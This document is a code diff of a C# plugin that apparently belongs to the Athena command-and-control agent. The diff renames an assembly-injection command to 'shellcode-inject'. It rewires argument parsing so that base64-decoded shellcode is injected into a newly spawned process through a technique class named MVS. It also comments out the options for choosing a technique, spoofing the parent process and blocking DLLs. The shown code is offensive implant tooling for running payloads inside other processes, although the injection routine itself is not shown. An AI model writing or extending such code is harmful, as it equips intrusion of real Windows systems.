@@ -3,57 +3,59 @@ using Athena.Utilities;
 using shellcode_inject.Techniques;
 using Microsoft.Win32.SafeHandles;
 using System.Runtime.InteropServices;
+using shellcode_inject;
 
-namespace shellcode_inject
+namespace Plugins
 {
-    public class InjectAssembly : AthenaPlugin
+    public class ShellcodeInject : AthenaPlugin
     {
-        public override string Name => "inject-assembly";
+        public override string Name => "shellcode-inject";
         private ITechnique technique = new MVS();
         public override void Execute(Dictionary<string, string> args)
         {
             string action = args["action"];
 
-            if (!string.IsNullOrEmpty(args["technique"]))
-            {
-                int choice;
-                if (int.TryParse(args["technique"], out choice))
-                {
-                    switch (choice) //The plugin will default to whatever the previous specified technique was
-                    {
-                        case 1:
-                            technique = new CRT();
-                            break;
-                        case 2:
-                        default:
-                            technique = new MVS();
-                            break;
-                    }
-                }
-            }
+            //if (!string.IsNullOrEmpty(args["technique"]))
+            //{
+            //    int choice;
+            //    if (int.TryParse(args["technique"], out choice))
+            //    {
+            //        switch (choice) //The plugin will default to whatever the previous specified technique was
+            //        {
+            //            case 1:
+            //                technique = new CRT();
+            //                break;
+            //            case 2:
+            //            default:
+            //                technique = new MVS();
+            //                break;
+            //        }
+            //    }
+            //}
 
-            if (!string.IsNullOrEmpty(args["assembly"]) && !string.IsNullOrEmpty(args["executable"]))
+            if (!string.IsNullOrEmpty(args["asm"]) && !string.IsNullOrEmpty(args["processName"]))
             {
                 bool spoofParent = false;
                 bool blockDlls = false;
                 int parent = 0;
 
-                byte[] b = Misc.Base64DecodeToByteArray(args["assembly"]);
+                byte[] b = Misc.Base64DecodeToByteArray(args["asm"]);
+                Console.WriteLine(b.Length);
 
-                if (!string.IsNullOrEmpty(args["parent"]))
-                {
-                    if (int.TryParse(args["parent"], out parent))
-                    {
-                        spoofParent = true;
-                    }
-                }
+                //if (!string.IsNullOrEmpty(args["parent"]))
+                //{
+                //    if (int.TryParse(args["parent"], out parent))
+                //    {
+                //        spoofParent = true;
+                //    }
+                //}
 
-                if (bool.Parse(args["blockdlls"]))
-                {
-                    blockDlls = true;
-                }
+                //if (bool.Parse(args["blockdlls"]))
+                //{
+                //    blockDlls = true;
+                //}
 
-                InjectNewProcess(args["executable"], spoofParent, blockDlls, parent, technique, b, args["task-id"]);
+                InjectNewProcess(args["processName"], spoofParent, blockDlls, parent, technique, b, args["task-id"]);
             }
         }
         static bool InjectNewProcess(string processName, bool spoofParent, bool blockDlls, int parentProcessId, ITechnique method, byte[] sc, string task_id)
